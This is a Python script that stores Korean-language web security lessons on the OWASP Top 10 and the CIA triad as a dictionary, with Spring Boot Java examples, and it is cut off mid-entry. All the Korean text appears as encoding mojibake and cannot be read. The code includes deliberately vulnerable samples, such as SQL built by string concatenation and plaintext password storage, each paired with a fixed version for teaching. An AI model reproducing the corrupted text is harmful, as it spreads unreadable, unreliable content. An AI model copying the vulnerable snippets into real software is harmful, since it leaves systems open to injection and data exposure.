# -*- coding: utf-8 -*-
"""
ë³´ì•ˆ ì½˜í…ì¸  ìƒì„± ìŠ¤í¬ë¦½íŠ¸ - Part 1
01_ê¸°ì´ˆ ì„¹ì…˜ (2ê°œ í† í”½: owasp-top10, security-triad)
02_ê³µê²© ì„¹ì…˜ - Core Attacks (4ê°œ í† í”½: sql-injection, sql-injection-prevent, xss, xss-prevent)
"""

import json
import sys

SECURITY_JSON_PATH = "src/data/contents/security.json"

SECURITY_CONTENTS = {
    # ===========================================
    # 01_ê¸°ì´ˆ ì„¹ì…˜
    # ===========================================
    "01_ê¸°ì´ˆ/owasp-top10": {
        "title": "OWASP Top 10 ì·¨ì•½ì  ì™„ë²½ ê°€ì´ë“œ",
        "description": "OWASP Top 10 ì·¨ì•½ì ì˜ ê°œë…, ê³µê²© ì›ë¦¬, ë°©ì–´ ë°©ë²•ì„ í•™ìŠµí•©ë‹ˆë‹¤.",
        "sections": [
            {
                "type": "concept",
                "title": "ğŸ¯ OWASP Top 10 ì™„ì „ ì •ë³µ",
                "content": "## í•œ ì¤„ ìš”ì•½\n> **ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ë³´ì•ˆ ìœ„í˜‘ TOP 10** - OWASPì—ì„œ ì„ ì •í•œ ê°€ì¥ ì¹˜ëª…ì ì¸ ë³´ì•ˆ ì·¨ì•½ì  ëª©ë¡!\n\n---\n\n## ğŸ’¡ ë¹„ìœ ë¡œ ì´í•´í•˜ê¸°\n\n```\nğŸ  ì§‘ ë³´ì•ˆì— ë¹„ìœ í•˜ë©´:\n\nOWASP Top 10 = ë„ë‘‘ì´ ê°€ì¥ ë§ì´ ì‚¬ìš©í•˜ëŠ” ì¹¨ì… ë°©ë²• TOP 10\n\n1. ì ê¸ˆì¥ì¹˜ ê³ ì¥ (Broken Access Control)\n   â””â”€â”€ ì—´ì‡  ì—†ì´ ë¬¸ ì—´ë¦¼\n\n2. ì•”í˜¸í™” ì‹¤íŒ¨ (Cryptographic Failures)\n   â””â”€â”€ ê¸ˆê³  ë¹„ë°€ë²ˆí˜¸ê°€ \"1234\"\n\n3. ì¸ì ì…˜ (Injection)\n   â””â”€â”€ ê°€ì§œ ì‹ ë¶„ì¦ìœ¼ë¡œ ì¶œì…\n\n4. ë¶ˆì•ˆì „í•œ ì„¤ê³„ (Insecure Design)\n   â””â”€â”€ ë’·ë¬¸ì— ì ê¸ˆì¥ì¹˜ê°€ ì—†ìŒ\n```\n\n---\n\n## ğŸš¨ ì™œ ì•Œì•„ì•¼ í•˜ë‚˜? - ì‹¤ì œ í•´í‚¹ ì‚¬ê³ \n\n### ëŒ€í‘œì  ì‚¬ë¡€:\n```\nğŸ“Œ 2017ë…„ Equifax í•´í‚¹ (1.4ì–µ ëª… ê°œì¸ì •ë³´ ìœ ì¶œ)\nì›ì¸: A03 Injection (Apache Struts ì·¨ì•½ì )\ní”¼í•´: $7ì–µ í•©ì˜ê¸ˆ, CEO ì‚¬ì„\n\nğŸ“Œ 2021ë…„ Log4j ì·¨ì•½ì  (ì „ ì„¸ê³„ ì˜í–¥)\nì›ì¸: A03 Injection (Log4Shell)\ní”¼í•´: ì—­ëŒ€ ìµœì•…ì˜ ì·¨ì•½ì , ìˆ˜ì‹­ë§Œ ì‹œìŠ¤í…œ ì˜í–¥\n\nğŸ“Œ 2023ë…„ MOVEit í•´í‚¹ (ìˆ˜ë°± ê°œ ê¸°ì—… í”¼í•´)\nì›ì¸: A01 Broken Access Control + A03 Injection\ní”¼í•´: ìˆ˜ì²œë§Œ ëª… ê°œì¸ì •ë³´ ìœ ì¶œ\n```\n\n### í”¼í•´ ê·œëª¨:\n```\nğŸ’° í‰ê·  ë°ì´í„° ìœ ì¶œ ë¹„ìš©: $4.45M (2023ë…„ ê¸°ì¤€)\nğŸ“Š ì›¹ ì·¨ì•½ì ìœ¼ë¡œ ì¸í•œ ê³µê²©: ì „ì²´ì˜ 70% ì´ìƒ\nğŸ”“ OWASP Top 10 ê´€ë ¨ ì·¨ì•½ì : í•´í‚¹ì˜ 90% ì°¨ì§€\n```"
            },
            {
                "type": "code",
                "title": "ğŸ’» OWASP Top 10 (2021) ìƒì„¸ ë¶„ì„",
                "content": "### OWASP Top 10 2021 ë²„ì „\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                    OWASP TOP 10 (2021)                      â”‚\nâ”œâ”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚ ìˆœìœ„ â”‚ ì·¨ì•½ì                      â”‚ í•µì‹¬ í‚¤ì›Œë“œ              â”‚\nâ”œâ”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚ A01 â”‚ Broken Access Control     â”‚ ê¶Œí•œ ìš°íšŒ, ì¸ê°€ ì‹¤íŒ¨      â”‚\nâ”‚ A02 â”‚ Cryptographic Failures    â”‚ ì•”í˜¸í™” ë¯¸í¡, í‰ë¬¸ ì €ì¥    â”‚\nâ”‚ A03 â”‚ Injection                 â”‚ SQL, XSS, Command ì£¼ì…    â”‚\nâ”‚ A04 â”‚ Insecure Design           â”‚ ì„¤ê³„ ê²°í•¨, ìœ„í˜‘ ëª¨ë¸ë§    â”‚\nâ”‚ A05 â”‚ Security Misconfiguration â”‚ ê¸°ë³¸ ì„¤ì •, ë¶ˆí•„ìš” ê¸°ëŠ¥    â”‚\nâ”‚ A06 â”‚ Vulnerable Components     â”‚ ì·¨ì•½í•œ ë¼ì´ë¸ŒëŸ¬ë¦¬         â”‚\nâ”‚ A07 â”‚ Auth. Failures            â”‚ ì¸ì¦ ìš°íšŒ, ì„¸ì…˜ ê´€ë¦¬      â”‚\nâ”‚ A08 â”‚ Software Integrity        â”‚ CI/CD, ë¬´ê²°ì„± ê²€ì¦        â”‚\nâ”‚ A09 â”‚ Logging & Monitoring      â”‚ ë¡œê¹… ë¶€ì¬, íƒì§€ ì‹¤íŒ¨      â”‚\nâ”‚ A10 â”‚ SSRF                      â”‚ ì„œë²„ì¸¡ ìš”ì²­ ìœ„ì¡°          â”‚\nâ””â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n### A01: Broken Access Control (ì ‘ê·¼ ì œì–´ ì‹¤íŒ¨)\n\n```java\n// âŒ ì·¨ì•½í•œ ì½”ë“œ - ê¶Œí•œ ì²´í¬ ì—†ìŒ\n@GetMapping(\"/admin/users/{id}\")\npublic User getUser(@PathVariable Long id) {\n    return userRepository.findById(id);  // ëˆ„êµ¬ë‚˜ ì ‘ê·¼ ê°€ëŠ¥!\n}\n\n// âœ… ì•ˆì „í•œ ì½”ë“œ - ê¶Œí•œ ì²´í¬\n@GetMapping(\"/admin/users/{id}\")\n@PreAuthorize(\"hasRole('ADMIN')\")\npublic User getUser(@PathVariable Long id) {\n    return userRepository.findById(id);\n}\n```\n\n### A02: Cryptographic Failures (ì•”í˜¸í™” ì‹¤íŒ¨)\n\n```java\n// âŒ ì·¨ì•½í•œ ì½”ë“œ - í‰ë¬¸ ë¹„ë°€ë²ˆí˜¸ ì €ì¥\npublic void saveUser(User user) {\n    user.setPassword(user.getPassword());  // í‰ë¬¸ ì €ì¥!\n    userRepository.save(user);\n}\n\n// âœ… ì•ˆì „í•œ ì½”ë“œ - BCrypt í•´ì‹œ\n@Autowired\nprivate PasswordEncoder passwordEncoder;\n\npublic void saveUser(User user) {\n    user.setPassword(passwordEncoder.encode(user.getPassword()));\n    userRepository.save(user);\n}\n```\n\n### A03: Injection (ì¸ì ì…˜)\n\n```java\n// âŒ SQL Injection ì·¨ì•½\nString query = \"SELECT * FROM users WHERE id = \" + userId;\n\n// âœ… PreparedStatement ì‚¬ìš©\nString query = \"SELECT * FROM users WHERE id = ?\";\npreparedStatement.setLong(1, userId);\n```"
            },
            {
                "type": "code",
                "title": "ğŸ›¡ï¸ OWASP Top 10 ë°©ì–´ ì „ëµ",
                "content": "### Spring Boot 3.x ê¸°ë°˜ í†µí•© ë³´ì•ˆ ì„¤ì •\n\n```java\n@Configuration\n@EnableWebSecurity\n@EnableMethodSecurity(prePostEnabled = true)\npublic class SecurityConfig {\n\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            // A01: ì ‘ê·¼ ì œì–´\n            .authorizeHttpRequests(auth -> auth\n                .requestMatchers(\"/public/**\").permitAll()\n                .requestMatchers(\"/admin/**\").hasRole(\"ADMIN\")\n                .anyRequest().authenticated()\n            )\n            \n            // A05: ë³´ì•ˆ í—¤ë” ì„¤ì •\n            .headers(headers -> headers\n                .contentSecurityPolicy(csp -> csp\n                    .policyDirectives(\"default-src 'self'; script-src 'self'\")\n                )\n                .frameOptions(frame -> frame.deny())\n                .xssProtection(xss -> xss.disable())  // CSPë¡œ ëŒ€ì²´\n            )\n            \n            // A07: ì„¸ì…˜ ê´€ë¦¬\n            .sessionManagement(session -> session\n                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)\n            )\n            \n            // CSRF ë³´í˜¸ (APIì˜ ê²½ìš° JWT ì‚¬ìš© ì‹œ ë¹„í™œì„±í™”)\n            .csrf(csrf -> csrf\n                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())\n            );\n\n        return http.build();\n    }\n\n    // A02: ë¹„ë°€ë²ˆí˜¸ ì•”í˜¸í™”\n    @Bean\n    public PasswordEncoder passwordEncoder() {\n        return new BCryptPasswordEncoder(12);  // work factor 12\n    }\n}\n```\n\n### A06: ì·¨ì•½í•œ ì»´í¬ë„ŒíŠ¸ ê´€ë¦¬ (Gradle)\n\n```groovy\n// build.gradle\nplugins {\n    id 'org.owasp.dependencycheck' version '9.0.0'\n}\n\ndependencyCheck {\n    failBuildOnCVSS = 7.0  // CVSS 7.0 ì´ìƒì´ë©´ ë¹Œë“œ ì‹¤íŒ¨\n    suppressionFile = 'dependency-check-suppressions.xml'\n}\n\n// ì‹¤í–‰: ./gradlew dependencyCheckAnalyze\n```\n\n### A09: ë³´ì•ˆ ë¡œê¹…\n\n```java\n@Slf4j\n@Aspect\n@Component\npublic class SecurityAuditAspect {\n\n    @Around(\"@annotation(secured)\")\n    public Object auditSecuredMethod(ProceedingJoinPoint joinPoint, Secured secured) \n            throws Throwable {\n        String username = SecurityContextHolder.getContext()\n            .getAuthentication().getName();\n        String method = joinPoint.getSignature().toShortString();\n        \n        log.info(\"[SECURITY AUDIT] User: {}, Action: {}, Roles: {}\", \n            username, method, secured.value());\n        \n        try {\n            Object result = joinPoint.proceed();\n            log.info(\"[SECURITY AUDIT] Success: {} by {}\", method, username);\n            return result;\n        } catch (AccessDeniedException e) {\n            log.warn(\"[SECURITY AUDIT] Access Denied: {} by {}\", method, username);\n            throw e;\n        }\n    }\n}\n```"
            },
            {
                "type": "tip",
                "title": "ğŸ’¡ ì‹¤ë¬´ ì²´í¬ë¦¬ìŠ¤íŠ¸ & ë©´ì ‘",
                "content": "### ì‹¤ë¬´ ì²´í¬ë¦¬ìŠ¤íŠ¸\n\n```\n[ í”„ë¡ íŠ¸ì—”ë“œ ]\nâ–¡ CSP í—¤ë” ì ìš©\nâ–¡ XSS ë°©ì§€ (ì…ë ¥ê°’ ì´ìŠ¤ì¼€ì´í”„)\nâ–¡ ë¯¼ê° ì •ë³´ localStorage ì €ì¥ ê¸ˆì§€\nâ–¡ HTTPS ê°•ì œ\n\n[ ë°±ì—”ë“œ ]\nâ–¡ ëª¨ë“  ì—”ë“œí¬ì¸íŠ¸ ê¶Œí•œ ì²´í¬ (A01)\nâ–¡ ë¹„ë°€ë²ˆí˜¸ BCrypt í•´ì‹œ (A02)\nâ–¡ PreparedStatement ì‚¬ìš© (A03)\nâ–¡ ì…ë ¥ê°’ ê²€ì¦ (A03)\nâ–¡ ë³´ì•ˆ í—¤ë” ì„¤ì • (A05)\nâ–¡ ì˜ì¡´ì„± ì·¨ì•½ì  ìŠ¤ìº” (A06)\nâ–¡ ì„¸ì…˜ íƒ€ì„ì•„ì›ƒ ì„¤ì • (A07)\nâ–¡ ë³´ì•ˆ ì´ë²¤íŠ¸ ë¡œê¹… (A09)\n\n[ ì¸í”„ë¼ ]\nâ–¡ WAF ì„¤ì •\nâ–¡ Rate Limiting\nâ–¡ ì¹¨ì… íƒì§€ ì‹œìŠ¤í…œ\n```\n\n### ë©´ì ‘ ì˜ˆìƒ ì§ˆë¬¸\n\n```\nğŸ‘¶ ì£¼ë‹ˆì–´ ë ˆë²¨:\nQ: OWASP Top 10ì´ ë¬´ì—‡ì¸ê°€ìš”?\nA: ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ê°€ì¥ í”í•˜ê³  ì¹˜ëª…ì ì¸ ë³´ì•ˆ ì·¨ì•½ì  10ê°€ì§€ë¥¼\n   OWASPì—ì„œ ì„ ì •í•œ ëª©ë¡ì…ë‹ˆë‹¤. 2-3ë…„ë§ˆë‹¤ ì—…ë°ì´íŠ¸ë©ë‹ˆë‹¤.\n\nQ: SQL Injectionì„ ì–´ë–»ê²Œ ë°©ì–´í•˜ë‚˜ìš”?\nA: PreparedStatement, ORM ì‚¬ìš©, ì…ë ¥ê°’ ê²€ì¦ìœ¼ë¡œ ë°©ì–´í•©ë‹ˆë‹¤.\n\nğŸ‘¨â€ğŸ’¼ ì‹œë‹ˆì–´ ë ˆë²¨:\nQ: A01 Broken Access Controlì´ 1ìœ„ê°€ ëœ ì´ìœ ëŠ”?\nA: 2017ë…„ 5ìœ„ì—ì„œ 2021ë…„ 1ìœ„ë¡œ ìƒìŠ¹. ë§ˆì´í¬ë¡œì„œë¹„ìŠ¤ í™•ì‚°ìœ¼ë¡œ\n   API ì—”ë“œí¬ì¸íŠ¸ê°€ ì¦ê°€í•˜ë©´ì„œ ê¶Œí•œ ì²´í¬ ëˆ„ë½ì´ ë¹ˆë²ˆí•´ì¡ŒìŠµë‹ˆë‹¤.\n\nQ: OWASP Top 10ì„ CI/CDì— ì–´ë–»ê²Œ í†µí•©í•˜ë‚˜ìš”?\nA: OWASP Dependency Check, SonarQube, SAST/DAST ë„êµ¬ë¥¼\n   íŒŒì´í”„ë¼ì¸ì— í†µí•©í•˜ì—¬ ìë™í™”ëœ ë³´ì•ˆ ê²€ì‚¬ë¥¼ ìˆ˜í–‰í•©ë‹ˆë‹¤.\n```\n\n### ë” ê³µë¶€í•  ìë£Œ\n\n```\nğŸ“š ê³µì‹ ë¬¸ì„œ:\n- OWASP Top 10: https://owasp.org/Top10/\n- OWASP Cheat Sheet: https://cheatsheetseries.owasp.org/\n- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/\n\nğŸ”§ ì‹¤ìŠµ í™˜ê²½:\n- OWASP WebGoat: ì·¨ì•½ì  í•™ìŠµ í”Œë«í¼\n- OWASP Juice Shop: í˜„ì‹¤ì ì¸ ì·¨ì•½ì  ì‹¤ìŠµ\n- PortSwigger Web Security Academy: ë¬´ë£Œ ì˜¨ë¼ì¸ í•™ìŠµ\n\nğŸ“Š ì·¨ì•½ì  DB:\n- CVE: https://cve.mitre.org/\n- NVD: https://nvd.nist.gov/\n```"
            }
        ]
    },

    "01_ê¸°ì´ˆ/security-triad": {
        "title": "CIA ì‚¼ì›ì¹™ (ê¸°ë°€ì„±, ë¬´ê²°ì„±, ê°€ìš©ì„±)",
        "description": "ì •ë³´ë³´ì•ˆì˜ 3ëŒ€ í•µì‹¬ ì›ì¹™ì¸ CIA Triadë¥¼ í•™ìŠµí•©ë‹ˆë‹¤.",
        "sections": [
            {
                "type": "concept",
                "title": "ğŸ¯ CIA ì‚¼ì›ì¹™ ì™„ì „ ì •ë³µ",
                "content": "## í•œ ì¤„ ìš”ì•½\n> **ê¸°ë°€ì„±(C), ë¬´ê²°ì„±(I), ê°€ìš©ì„±(A)** - ì •ë³´ë³´ì•ˆì˜ 3ëŒ€ í•µì‹¬ ì›ì¹™!\n\n---\n\n## ğŸ’¡ ë¹„ìœ ë¡œ ì´í•´í•˜ê¸°\n\n```\nğŸ¦ ì€í–‰ ê¸ˆê³ ì— ë¹„ìœ í•˜ë©´:\n\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚           CIA Triad (ì‚¼ì›ì¹™)             â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚                                         â”‚\nâ”‚     ğŸ” Confidentiality (ê¸°ë°€ì„±)          â”‚\nâ”‚     \"ê¸ˆê³  ë¹„ë°€ë²ˆí˜¸ëŠ” ë‚˜ë§Œ ì•ˆë‹¤\"           â”‚\nâ”‚     â†’ í—ˆê°€ëœ ì‚¬ëŒë§Œ ì ‘ê·¼                 â”‚\nâ”‚                                         â”‚\nâ”‚     âœ… Integrity (ë¬´ê²°ì„±)                â”‚\nâ”‚     \"ê¸ˆê³  ì•ˆ ëˆì´ ì¡°ì‘ë˜ì§€ ì•Šì•˜ë‹¤\"        â”‚\nâ”‚     â†’ ë°ì´í„°ê°€ ë³€ì¡°ë˜ì§€ ì•ŠìŒ             â”‚\nâ”‚                                         â”‚\nâ”‚     ğŸŸ¢ Availability (ê°€ìš©ì„±)             â”‚\nâ”‚     \"í•„ìš”í•  ë•Œ ê¸ˆê³ ë¥¼ ì—´ ìˆ˜ ìˆë‹¤\"         â”‚\nâ”‚     â†’ ì–¸ì œë“  ì ‘ê·¼ ê°€ëŠ¥                   â”‚\nâ”‚                                         â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n---\n\n## ğŸš¨ ì™œ ì•Œì•„ì•¼ í•˜ë‚˜? - ì‹¤ì œ ì‚¬ê³  ì‚¬ë¡€\n\n### ê¸°ë°€ì„± ì¹¨í•´ ì‚¬ë¡€:\n```\nğŸ“Œ 2023ë…„ ì‚¼ì„±ì „ì ì±—GPT ê¸°ë°€ ìœ ì¶œ\nì›ì¸: ì§ì›ì´ ë‚´ë¶€ ì†ŒìŠ¤ì½”ë“œë¥¼ ChatGPTì— ì…ë ¥\ní”¼í•´: ë°˜ë„ì²´ í•µì‹¬ ê¸°ìˆ  ìœ ì¶œ ìœ„í—˜\nêµí›ˆ: ë°ì´í„° ë¶„ë¥˜ ë° ì ‘ê·¼ í†µì œ í•„ìš”\n```\n\n### ë¬´ê²°ì„± ì¹¨í•´ ì‚¬ë¡€:\n```\nğŸ“Œ 2020ë…„ SolarWinds ê³µê¸‰ë§ ê³µê²©\nì›ì¸: ë¹Œë“œ ì‹œìŠ¤í…œ ì¹¨íˆ¬ â†’ ì•…ì„±ì½”ë“œ ì‚½ì…\ní”¼í•´: 18,000+ ì¡°ì§ ê°ì—¼, ë¯¸ ì •ë¶€ê¸°ê´€ í¬í•¨\nêµí›ˆ: ì½”ë“œ ì„œëª…, ë¬´ê²°ì„± ê²€ì¦ í•„ìˆ˜\n```\n\n### ê°€ìš©ì„± ì¹¨í•´ ì‚¬ë¡€:\n```\nğŸ“Œ 2023ë…„ ëŒ€í•œí•­ê³µ DDoS ê³µê²©\nì›ì¸: ëŒ€ê·œëª¨ ë¶„ì‚° ì„œë¹„ìŠ¤ ê±°ë¶€ ê³µê²©\ní”¼í•´: í•­ê³µê¶Œ ì˜ˆì•½ ì‹œìŠ¤í…œ ë§ˆë¹„\nêµí›ˆ: DDoS ë°©ì–´ ì²´ê³„, ì´ì¤‘í™” í•„ìš”\n```\n\n### í”¼í•´ ê·œëª¨:\n```\nğŸ’° ê¸°ë°€ì„± ì¹¨í•´: í‰ê·  $4.45M/ê±´ (ë°ì´í„° ìœ ì¶œ)\nğŸ”§ ë¬´ê²°ì„± ì¹¨í•´: ëœì„¬ì›¨ì–´ í”¼í•´ $1.85M/ê±´ (2023)\nâ° ê°€ìš©ì„± ì¹¨í•´: ì‹œìŠ¤í…œ ë‹¤ìš´íƒ€ì„ $5,600/ë¶„\n```"
            },
            {
                "type": "code",
                "title": "ğŸ’» CIA ì‚¼ì›ì¹™ êµ¬í˜„",
                "content": "### CIA ë³´ì•ˆ íë¦„ë„\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                    ì‚¬ìš©ì ìš”ì²­ íë¦„                          â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚                                                             â”‚\nâ”‚   [ì‚¬ìš©ì] â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ [ì„œë²„]        â”‚\nâ”‚       â”‚                                         â”‚           â”‚\nâ”‚       â”‚  1. ğŸ” ê¸°ë°€ì„± ì²´í¬                       â”‚           â”‚\nâ”‚       â”‚     â””â”€â”€ ì¸ì¦/ì¸ê°€ í™•ì¸                   â”‚           â”‚\nâ”‚       â”‚     â””â”€â”€ ì•”í˜¸í™” í†µì‹  (HTTPS)             â”‚           â”‚\nâ”‚       â”‚                                         â”‚           â”‚\nâ”‚       â”‚  2. âœ… ë¬´ê²°ì„± ì²´í¬                       â”‚           â”‚\nâ”‚       â”‚     â””â”€â”€ ë°ì´í„° ì„œëª… ê²€ì¦                 â”‚           â”‚\nâ”‚       â”‚     â””â”€â”€ í•´ì‹œê°’ ë¹„êµ                      â”‚           â”‚\nâ”‚       â”‚                                         â”‚           â”‚\nâ”‚       â”‚  3. ğŸŸ¢ ê°€ìš©ì„± ë³´ì¥                       â”‚           â”‚\nâ”‚       â”‚     â””â”€â”€ ë¡œë“œë°¸ëŸ°ì‹±                       â”‚           â”‚\nâ”‚       â”‚     â””â”€â”€ ì¥ì•  ë³µêµ¬                        â”‚           â”‚\nâ”‚       â–¼                                         â–¼           â”‚\nâ”‚   [ì‘ë‹µ ë°˜í™˜] â—€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ [ì²˜ë¦¬ ì™„ë£Œ]      â”‚\nâ”‚                                                             â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n### 1. ê¸°ë°€ì„± (Confidentiality) êµ¬í˜„\n\n```java\n@Configuration\n@EnableWebSecurity\npublic class ConfidentialityConfig {\n\n    // ì ‘ê·¼ ì œì–´ - ì¸ê°€ëœ ì‚¬ìš©ìë§Œ ì ‘ê·¼\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            .authorizeHttpRequests(auth -> auth\n                // ê¸°ë°€ ë°ì´í„°: ADMINë§Œ ì ‘ê·¼\n                .requestMatchers(\"/api/confidential/**\").hasRole(\"ADMIN\")\n                // ë¯¼ê° ë°ì´í„°: ì¸ì¦ëœ ì‚¬ìš©ìë§Œ\n                .requestMatchers(\"/api/sensitive/**\").authenticated()\n                // ê³µê°œ ë°ì´í„°\n                .requestMatchers(\"/api/public/**\").permitAll()\n            )\n            // HTTPS ê°•ì œ\n            .requiresChannel(channel -> channel\n                .anyRequest().requiresSecure()\n            );\n        return http.build();\n    }\n}\n\n// ë°ì´í„° ì•”í˜¸í™” ì„œë¹„ìŠ¤\n@Service\npublic class EncryptionService {\n    \n    private static final String ALGORITHM = \"AES/GCM/NoPadding\";\n    \n    public String encrypt(String plainText, SecretKey key) throws Exception {\n        Cipher cipher = Cipher.getInstance(ALGORITHM);\n        byte[] iv = new byte[12];\n        SecureRandom.getInstanceStrong().nextBytes(iv);\n        \n        cipher.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));\n        byte[] encrypted = cipher.doFinal(plainText.getBytes(StandardCharsets.UTF_8));\n        \n        // IV + ì•”í˜¸ë¬¸ ê²°í•©\n        byte[] combined = new byte[iv.length + encrypted.length];\n        System.arraycopy(iv, 0, combined, 0, iv.length);\n        System.arraycopy(encrypted, 0, combined, iv.length, encrypted.length);\n        \n        return Base64.getEncoder().encodeToString(combined);\n    }\n}\n```\n\n### 2. ë¬´ê²°ì„± (Integrity) êµ¬í˜„\n\n```java\n@Service\npublic class IntegrityService {\n    \n    // ë°ì´í„° í•´ì‹œ ìƒì„±\n    public String generateHash(String data) throws NoSuchAlgorithmException {\n        MessageDigest digest = MessageDigest.getInstance(\"SHA-256\");\n        byte[] hash = digest.digest(data.getBytes(StandardCharsets.UTF_8));\n        return Base64.getEncoder().encodeToString(hash);\n    }\n    \n    // ë¬´ê²°ì„± ê²€ì¦\n    public boolean verifyIntegrity(String data, String expectedHash) \n            throws NoSuchAlgorithmException {\n        String actualHash = generateHash(data);\n        return MessageDigest.isEqual(\n            actualHash.getBytes(), \n            expectedHash.getBytes()\n        );\n    }\n}\n\n// API ìš”ì²­ ë¬´ê²°ì„± ê²€ì¦ í•„í„°\n@Component\npublic class IntegrityFilter extends OncePerRequestFilter {\n    \n    @Override\n    protected void doFilterInternal(HttpServletRequest request,\n            HttpServletResponse response, FilterChain chain) \n            throws ServletException, IOException {\n        \n        String signature = request.getHeader(\"X-Signature\");\n        if (signature != null) {\n            // HMAC ì„œëª… ê²€ì¦\n            String body = StreamUtils.copyToString(\n                request.getInputStream(), StandardCharsets.UTF_8\n            );\n            \n            if (!verifyHmacSignature(body, signature)) {\n                response.sendError(HttpStatus.FORBIDDEN.value(), \n                    \"Integrity check failed\");\n                return;\n            }\n        }\n        chain.doFilter(request, response);\n    }\n}\n```"
            },
            {
                "type": "code",
                "title": "ğŸ›¡ï¸ ê°€ìš©ì„± êµ¬í˜„ & í†µí•© ì•„í‚¤í…ì²˜",
                "content": "### 3. ê°€ìš©ì„± (Availability) êµ¬í˜„\n\n```java\n// Rate Limitingìœ¼ë¡œ DDoS ë°©ì–´\n@Configuration\npublic class RateLimitConfig {\n    \n    @Bean\n    public Bucket createBucket() {\n        Bandwidth limit = Bandwidth.classic(100, Refill.greedy(100, Duration.ofMinutes(1)));\n        return Bucket.builder().addLimit(limit).build();\n    }\n}\n\n@Component\npublic class RateLimitFilter extends OncePerRequestFilter {\n    \n    @Autowired\n    private Bucket bucket;\n    \n    @Override\n    protected void doFilterInternal(HttpServletRequest request,\n            HttpServletResponse response, FilterChain chain) \n            throws ServletException, IOException {\n        \n        if (bucket.tryConsume(1)) {\n            chain.doFilter(request, response);\n        } else {\n            response.setStatus(HttpStatus.TOO_MANY_REQUESTS.value());\n            response.getWriter().write(\"Rate limit exceeded\");\n        }\n    }\n}\n\n// Circuit Breakerë¡œ ì¥ì•  ì „íŒŒ ë°©ì§€\n@Service\npublic class ResilientService {\n    \n    @CircuitBreaker(name = \"backendService\", fallbackMethod = \"fallback\")\n    @Retry(name = \"backendService\")\n    public String callExternalService() {\n        return restTemplate.getForObject(\"http://external-api/data\", String.class);\n    }\n    \n    public String fallback(Exception e) {\n        return \"Service temporarily unavailable. Using cached data.\";\n    }\n}\n```\n\n### CIA í†µí•© 